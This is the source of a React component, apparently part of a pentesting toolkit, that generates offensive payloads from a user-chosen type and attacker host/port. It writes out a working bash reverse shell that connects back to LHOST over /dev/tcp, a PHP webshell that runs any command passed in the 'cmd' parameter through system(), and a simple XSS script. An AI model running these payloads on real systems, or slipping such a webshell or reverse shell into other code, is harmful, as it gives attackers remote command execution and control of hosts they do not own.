"use client";

import { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from '@/components/ui/textarea';

export default function PayloadStudio() {
    const [payloadType, setPayloadType] = useState('bash-revshell');
    const [lhost, setLhost] = useState('10.10.10.1');
    const [lport, setLport] = useState('4444');
    const [generatedPayload, setGeneratedPayload] = useState('');

    const generatePayload = () => {
        let payload = '';
        switch(payloadType) {
            case 'bash-revshell':
                payload = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
                break;
            case 'php-webshell':
                payload = `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`;
                break;
            case 'xss-alert':
                payload = `<script>alert('XSS')</script>`;
                break;
        }
        setGeneratedPayload(payload);
    };

  return (
    <div className="h-full w-full flex flex-col gap-4">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
              <Label htmlFor="payload-type" className="text-primary">Payload Type</Label>
              <Select value={payloadType} onValueChange={setPayloadType}>
                  <SelectTrigger id="payload-type">
                      <SelectValue placeholder="Select payload type" />
                  </SelectTrigger>
                  <SelectContent>
                      <SelectItem value="bash-revshell">Bash Reverse Shell</SelectItem>
                      <SelectItem value="php-webshell">PHP Webshell</SelectItem>
                      <SelectItem value="xss-alert">Simple XSS</SelectItem>
                  </SelectContent>
              </Select>
          </div>
          <div className="grid grid-cols-2 gap-2">
              <div>
                  <Label htmlFor="lhost" className="text-primary">LHOST</Label>
                  <Input id="lhost" value={lhost} onChange={e => setLhost(e.target.value)} placeholder="10.10.10.1" />
              </div>
              <div>
                  <Label htmlFor="lport" className="text-primary">LPORT</Label>
                  <Input id="lport" value={lport} onChange={e => setLport(e.target.value)} placeholder="4444" />
              </div>
          </div>
      </div>
      <Button onClick={generatePayload} className="bg-primary hover:bg-primary/80 text-primary-foreground">Generate Payload</Button>
      <div className="flex-1 flex flex-col">
        <Label htmlFor="generated-payload" className="text-primary">Generated Payload</Label>
        <Textarea 
            id="generated-payload"
            readOnly
            value={generatedPayload}
            className="flex-1 w-full bg-background/50 font-code text-accent border-accent/20 focus-visible:ring-accent resize-none"
            placeholder="// Payload will appear here..."
        />
      </div>
    </div>
  );
}
